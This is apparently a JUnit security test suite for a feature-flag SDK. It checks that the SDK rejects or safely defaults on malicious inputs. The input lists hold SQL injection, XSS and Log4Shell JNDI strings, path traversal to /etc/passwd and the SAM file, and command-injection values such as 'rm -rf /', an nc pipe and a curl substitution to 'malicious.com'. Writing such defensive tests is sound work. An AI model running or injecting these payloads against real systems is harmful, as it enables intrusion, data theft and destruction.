package com.featureflagshq.sdk.unit;

import com.featureflagshq.sdk.FeatureFlagsHQSDK;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;
import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

@DisplayName("Security-Focused Tests")
public class SecurityTest {

    private FeatureFlagsHQSDK sdk;
    private static final String TEST_CLIENT_ID = "test-client-id";
    private static final String TEST_CLIENT_SECRET = "test-client-secret";
    private static final String TEST_USER_ID = "test-user-123";

    @BeforeEach
    void setUp() {
        sdk = new FeatureFlagsHQSDK.Builder()
                .clientId(TEST_CLIENT_ID)
                .clientSecret(TEST_CLIENT_SECRET)
                .environment("test")
                .offlineMode(true)
                .enableMetrics(false)
                .build();
    }

    @AfterEach
    void tearDown() {
        if (sdk != null) {
            sdk.close();
        }
    }

    @Nested
    @DisplayName("Input Sanitization Tests")
    class InputSanitizationTests {

        @Test
        @DisplayName("Should reject SQL injection attempts in user ID")
        void shouldRejectSqlInjectionAttemptsInUserId() {
            String[] sqlInjectionAttempts = {
                "user'; DROP TABLE users; --",
                "user' OR '1'='1",
                "user'; INSERT INTO flags VALUES ('malicious'); --",
                "user' UNION SELECT * FROM secrets --",
                "user'; DELETE FROM flags; --",
                "user' /*comment*/ OR 1=1 --"
            };

            for (String maliciousUserId : sqlInjectionAttempts) {
                boolean result = sdk.getBool(maliciousUserId, "test_flag", true);
                assertTrue(result, "Should return default value for malicious user ID: " + maliciousUserId);
            }
        }

        @Test
        @DisplayName("Should reject SQL injection attempts in flag names")
        void shouldRejectSqlInjectionAttemptsInFlagNames() {
            String[] sqlInjectionAttempts = {
                "flag'; DROP TABLE flags; --",
                "flag' OR '1'='1",
                "flag'; UPDATE flags SET value=true; --",
                "flag' UNION SELECT password FROM users --"
            };

            for (String maliciousFlagName : sqlInjectionAttempts) {
                boolean result = sdk.getBool(TEST_USER_ID, maliciousFlagName, false);
                assertFalse(result, "Should return default value for malicious flag name: " + maliciousFlagName);
            }
        }

        @Test
        @DisplayName("Should reject script injection attempts")
        void shouldRejectScriptInjectionAttempts() {
            String[] scriptInjectionAttempts = {
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "onload=alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "user<script>fetch('/steal-data')</script>",
                "'; eval('malicious code'); //",
                "${jndi:ldap://malicious.com/exploit}"
            };

            for (String maliciousInput : scriptInjectionAttempts) {
                boolean result = sdk.getBool(maliciousInput, "test_flag", true);
                assertTrue(result, "Should handle script injection safely: " + maliciousInput);
            }
        }

        @Test
        @DisplayName("Should reject path traversal attempts")
        void shouldRejectPathTraversalAttempts() {
            String[] pathTraversalAttempts = {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "user/../../sensitive/file.txt"
            };

            for (String maliciousPath : pathTraversalAttempts) {
                String result = sdk.getString(TEST_USER_ID, maliciousPath, "safe");
                assertEquals("safe", result, "Should return default for path traversal: " + maliciousPath);
            }
        }

        @Test
        @DisplayName("Should handle command injection attempts")
        void shouldHandleCommandInjectionAttempts() {
            String[] commandInjectionAttempts = {
                "user; rm -rf /",
                "user && cat /etc/passwd",
                "user | nc malicious.com 4444",
                "user`whoami`",
                "user$(curl malicious.com)",
                "user;shutdown /s /t 0",
                "user & type C:\\Windows\\System32\\drivers\\etc\\hosts"
            };

            for (String maliciousCommand : commandInjectionAttempts) {
                boolean result = sdk.getBool(maliciousCommand, "test_flag", false);
                assertFalse(result, "Should handle command injection safely: " + maliciousCommand);
            }
        }
    }

    @Nested
    @DisplayName("Data Validation Security Tests")
    class DataValidationSecurityTests {

        @Test
        @DisplayName("Should validate and sanitize segment data")
        void shouldValidateAndSanitizeSegmentData() {
            Map<String, Object> maliciousSegments = new HashMap<>();
            maliciousSegments.put("'; DROP TABLE users; --", "malicious_key");
            maliciousSegments.put("normal_key", "'; DROP TABLE flags; --");
            maliciousSegments.put("<script>alert('xss')</script>", "malicious_script");
            maliciousSegments.put("safe_key", "../../../etc/passwd");

            boolean result = sdk.getBool(TEST_USER_ID, "test_flag", true, maliciousSegments);
            assertTrue(result); // Should return default safely
        }

        @Test
        @DisplayName("Should handle oversized input attempts")
        void shouldHandleOversizedInputAttempts() {
            // Extremely large user ID (potential DoS attempt)
            String oversizedUserId = "a".repeat(100000);
            boolean result = sdk.getBool(oversizedUserId, "test_flag", false);
            assertFalse(result); // Should handle gracefully

            // Extremely large flag name
            String oversizedFlagName = "b".repeat(100000);
            boolean result2 = sdk.getBool(TEST_USER_ID, oversizedFlagName, true);
            assertTrue(result2); // Should handle gracefully

            // Extremely large segment values
            Map<String, Object> oversizedSegments = new HashMap<>();
            oversizedSegments.put("large_value", "x".repeat(1000000));
            boolean result3 = sdk.getBool(TEST_USER_ID, "test_flag", false, oversizedSegments);
            assertFalse(result3); // Should handle gracefully
        }

        @Test
        @DisplayName("Should reject null byte injection attempts")
        void shouldRejectNullByteInjectionAttempts() {
            String[] nullByteAttempts = {
                "user\0.jpg",
                "user\0\0\0",
                "normal_user\0../../../etc/passwd",
                "user\0; rm -rf /",
                "flag\0.txt"
            };

            for (String nullByteInput : nullByteAttempts) {
                boolean result = sdk.getBool(nullByteInput, "test_flag", true);
                assertTrue(result, "Should handle null byte injection: " + nullByteInput.replace("\0", "\\0"));
            }
        }

        @Test
        @DisplayName("Should handle format string attacks")
        void shouldHandleFormatStringAttacks() {
            String[] formatStringAttempts = {
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                "user%08x.%08x.%08x.%08x",
                "%s%p%x%d%.2000d%x%s%p%d%s%p%x%d"
            };

            for (String formatAttack : formatStringAttempts) {
                String result = sdk.getString(TEST_USER_ID, formatAttack, "safe");
                assertEquals("safe", result, "Should handle format string attack: " + formatAttack);
            }
        }
    }

    @Nested
    @DisplayName("Authentication Security Tests")
    class AuthenticationSecurityTests {

        @Test
        @DisplayName("Should reject empty credentials")
        void shouldRejectEmptyCredentials() {
            assertThrows(IllegalArgumentException.class, () -> {
                new FeatureFlagsHQSDK.Builder()
                        .clientId("")
                        .clientSecret(TEST_CLIENT_SECRET)
                        .build();
            });

            assertThrows(IllegalArgumentException.class, () -> {
                new FeatureFlagsHQSDK.Builder()
                        .clientId(TEST_CLIENT_ID)
                        .clientSecret("")
                        .build();
            });
        }

        @Test
        @DisplayName("Should reject credentials with dangerous patterns")
        void shouldRejectCredentialsWithDangerousPatterns() {
            String[] dangerousCredentials = {
                "client\nid",
                "client\rid",
                "client\tid",
                "client\0id",
                "client; DROP TABLE auth; --"
            };

            for (String dangerousCredential : dangerousCredentials) {
                assertThrows(IllegalArgumentException.class, () -> {
                    new FeatureFlagsHQSDK.Builder()
                            .clientId(dangerousCredential)
                            .clientSecret(TEST_CLIENT_SECRET)
                            .build();
                }, "Should reject dangerous credential: " + dangerousCredential.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t").replace("\0", "\\0"));
            }
        }

        @Test
        @DisplayName("Should validate URL security")
        void shouldValidateUrlSecurity() {
            String[] maliciousUrls = {
                "javascript:alert('xss')",
                "data:text/html,<script>alert('xss')</script>",
                "file:///etc/passwd",
                "ftp://malicious.com",
                "gopher://malicious.com",
                "ldap://malicious.com",
                "jar:file:///etc/passwd!/",
                "http://malicious.com@legitimate.com",
                "https://user:pass@malicious.com/path"
            };

            for (String maliciousUrl : maliciousUrls) {
                if (maliciousUrl.startsWith("javascript:") || maliciousUrl.startsWith("data:") || 
                    maliciousUrl.startsWith("file:") || maliciousUrl.startsWith("ftp:") ||
                    maliciousUrl.startsWith("gopher:") || maliciousUrl.startsWith("ldap:") ||
                    maliciousUrl.startsWith("jar:")) {
                    
                    assertThrows(IllegalArgumentException.class, () -> {
                        new FeatureFlagsHQSDK.Builder()
                                .clientId(TEST_CLIENT_ID)
                                .clientSecret(TEST_CLIENT_SECRET)
                                .apiBaseUrl(maliciousUrl)
                                .build();
                    }, "Should reject malicious URL: " + maliciousUrl);
                }
            }
        }
    }

    @Nested
    @DisplayName("Information Disclosure Prevention Tests")
    class InformationDisclosurePreventionTests {

        @Test
        @DisplayName("Should not leak sensitive information in error messages")
        void shouldNotLeakSensitiveInformationInErrorMessages() {
            try {
                new FeatureFlagsHQSDK.Builder()
                        .clientId(TEST_CLIENT_ID)
                        .clientSecret("") // Empty secret
                        .build();
                fail("Should have thrown exception");
            } catch (IllegalArgumentException e) {
                String message = e.getMessage();
                assertFalse(message.contains(TEST_CLIENT_ID), "Error message should not contain client ID");
                assertFalse(message.contains("secret_value"), "Error message should not contain secret values");
            }
        }

        @Test
        @DisplayName("Should sanitize logs and prevent information leakage")
        void shouldSanitizeLogsAndPreventInformationLeakage() {
            // Test that sensitive data doesn't appear in logs or responses
            Map<String, Object> sensitiveSegments = new HashMap<>();
            sensitiveSegments.put("password", "secret123");
            sensitiveSegments.put("api_key", "sk_live_abc123");
            sensitiveSegments.put("credit_card", "4111111111111111");
            sensitiveSegments.put("ssn", "123-45-6789");

            // SDK should handle this without exposing sensitive data
            boolean result = sdk.getBool(TEST_USER_ID, "test_flag", false, sensitiveSegments);
            assertFalse(result);

            // Verify stats don't contain sensitive information
            Map<String, Object> stats = sdk.getStats();
            String statsString = stats.toString();
            assertFalse(statsString.contains("secret123"), "Stats should not contain passwords");
            assertFalse(statsString.contains("sk_live_abc123"), "Stats should not contain API keys");
            assertFalse(statsString.contains("4111111111111111"), "Stats should not contain credit cards");
        }

        @Test
        @DisplayName("Should prevent timing attacks")
        void shouldPreventTimingAttacks() {
            String validUserId = "valid_user_123";
            String invalidUserId = "'; DROP TABLE users; --";

            // Measure timing for valid vs invalid inputs
            long startValid = System.nanoTime();
            sdk.getBool(validUserId, "test_flag", false);
            long validTime = System.nanoTime() - startValid;

            long startInvalid = System.nanoTime();
            sdk.getBool(invalidUserId, "test_flag", false);
            long invalidTime = System.nanoTime() - startInvalid;

            // Times should be reasonably similar (allowing for normal variance)
            double ratio = (double) Math.max(validTime, invalidTime) / Math.min(validTime, invalidTime);
            assertTrue(ratio < 10.0, "Timing difference should not reveal information about input validity");
        }
    }

    @Nested
    @DisplayName("Denial of Service Prevention Tests")
    class DenialOfServicePreventionTests {

        @Test
        @DisplayName("Should handle resource exhaustion attempts")
        void shouldHandleResourceExhaustionAttempts() {
            // Attempt to exhaust memory with many unique users
            for (int i = 0; i < 20000; i++) { // Above MAX_UNIQUE_USERS_TRACKED
                String userId = "dos_user_" + i;
                sdk.getBool(userId, "dos_flag", false);
            }

            Map<String, Object> stats = sdk.getStats();
            Integer uniqueUsers = (Integer) stats.get("unique_users_count");
            assertTrue(uniqueUsers <= 10000, "Should limit tracked users to prevent DoS");

            // SDK should still be responsive
            Map<String, Object> health = sdk.getHealthCheck();
            assertEquals("healthy", health.get("status"));
        }

        @Test
        @DisplayName("Should handle algorithmic complexity attacks")
        void shouldHandleAlgorithmicComplexityAttacks() {
            // Create deeply nested segments that could cause exponential processing
            Map<String, Object> complexSegments = new HashMap<>();
            
            // Create patterns that might trigger worst-case algorithm behavior
            for (int i = 0; i < 1000; i++) {
                complexSegments.put("key_" + i, "value_" + i + "_" + "x".repeat(100));
            }

            long startTime = System.currentTimeMillis();
            boolean result = sdk.getBool(TEST_USER_ID, "complex_flag", false, complexSegments);
            long duration = System.currentTimeMillis() - startTime;

            assertFalse(result);
            assertTrue(duration < 5000, "Complex segment processing should complete within 5 seconds");
        }

        @Test
        @DisplayName("Should rate limit excessive requests")
        void shouldRateLimitExcessiveRequests() {
            // Simulate rapid-fire requests that could be a DoS attempt
            int rapidRequests = 2000;
            long startTime = System.currentTimeMillis();

            for (int i = 0; i < rapidRequests; i++) {
                sdk.getBool("rapid_user_" + (i % 10), "rapid_flag", false);
            }

            long duration = System.currentTimeMillis() - startTime;

            // Should handle the load without significant performance degradation
            assertTrue(duration < 10000, "Should handle rapid requests efficiently");

            // SDK should remain healthy
            Map<String, Object> health = sdk.getHealthCheck();
            assertEquals("healthy", health.get("status"));
        }
    }

    @Nested
    @DisplayName("Configuration Security Tests")
    class ConfigurationSecurityTests {

        @Test
        @DisplayName("Should validate production configuration security")
        void shouldValidateProductionConfigurationSecurity() {
            Map<String, Object> insecureConfig = new HashMap<>();
            insecureConfig.put("api_base_url", "http://insecure.example.com"); // HTTP instead of HTTPS
            insecureConfig.put("timeout", 1); // Too low
            insecureConfig.put("client_secret", "weak"); // Weak secret

            List<String> warnings = FeatureFlagsHQSDK.validateProductionConfig(insecureConfig);
            assertFalse(warnings.isEmpty(), "Should detect insecure configuration");
            
            assertTrue(warnings.stream().anyMatch(w -> w.contains("HTTP instead of HTTPS")));
            assertTrue(warnings.stream().anyMatch(w -> w.contains("Timeout too low")));
            assertTrue(warnings.stream().anyMatch(w -> w.contains("weak")));
        }

        @Test
        @DisplayName("Should enforce secure defaults in production client")
        void shouldEnforceSecureDefaultsInProductionClient() {
            Map<String, Object> options = new HashMap<>();
            options.put("offline_mode", true); // For testing

            FeatureFlagsHQSDK prodClient = FeatureFlagsHQSDK.createProductionClient(
                TEST_CLIENT_ID,
                TEST_CLIENT_SECRET,
                "production",
                options
            );

            try {
                Map<String, Object> health = prodClient.getHealthCheck();
                assertEquals("production", health.get("environment"));
                assertTrue((Boolean) health.get("offline_mode"));
            } finally {
                prodClient.close();
            }
        }

        @Test
        @DisplayName("Should prevent configuration tampering")
        void shouldPreventConfigurationTampering() {
            // Test that configuration cannot be modified after SDK creation
            FeatureFlagsHQSDK testSDK = new FeatureFlagsHQSDK.Builder()
                    .clientId(TEST_CLIENT_ID)
                    .clientSecret(TEST_CLIENT_SECRET)
                    .environment("secure_test")
                    .offlineMode(true)
                    .build();

            try {
                Map<String, Object> health = testSDK.getHealthCheck();
                assertEquals("secure_test", health.get("environment"));

                // Configuration should be immutable
                String environment = (String) health.get("environment");
                assertEquals("secure_test", environment);

            } finally {
                testSDK.close();
            }
        }
    }

    @Nested
    @DisplayName("Cryptographic Security Tests")
    class CryptographicSecurityTests {

        @Test
        @DisplayName("Should generate unique session IDs")
        void shouldGenerateUniqueSessionIds() {
            FeatureFlagsHQSDK sdk1 = new FeatureFlagsHQSDK.Builder()
                    .clientId(TEST_CLIENT_ID)
                    .clientSecret(TEST_CLIENT_SECRET)
                    .offlineMode(true)
                    .build();

            FeatureFlagsHQSDK sdk2 = new FeatureFlagsHQSDK.Builder()
                    .clientId(TEST_CLIENT_ID)
                    .clientSecret(TEST_CLIENT_SECRET)
                    .offlineMode(true)
                    .build();

            try {
                Map<String, Object> health1 = sdk1.getHealthCheck();
                Map<String, Object> health2 = sdk2.getHealthCheck();

                String sessionId1 = (String) health1.get("session_id");
                String sessionId2 = (String) health2.get("session_id");

                assertNotNull(sessionId1);
                assertNotNull(sessionId2);
                assertNotEquals(sessionId1, sessionId2, "Session IDs should be unique");

                // Session IDs should look like valid UUIDs
                assertTrue(sessionId1.matches("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"));
                assertTrue(sessionId2.matches("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"));

            } finally {
                sdk1.close();
                sdk2.close();
            }
        }

        @Test
        @DisplayName("Should handle cryptographic edge cases")
        void shouldHandleCryptographicEdgeCases() {
            // Test with edge case values that might affect hashing/encryption
            String[] edgeCaseInputs = {
                "",  // Empty string
                "0", // Single character
                "00000000000000000000000000000000", // All zeros
                "ffffffffffffffffffffffffffffffff", // All f's (hex)
                "\u0000\u0001\u0002\u0003", // Binary data
                "🔒🗝️🛡️", // Unicode security symbols
            };

            for (String input : edgeCaseInputs) {
                boolean result = sdk.getBool(input, "crypto_test", false);
                assertNotNull(result); // Should handle all inputs safely
            }
        }
    }
}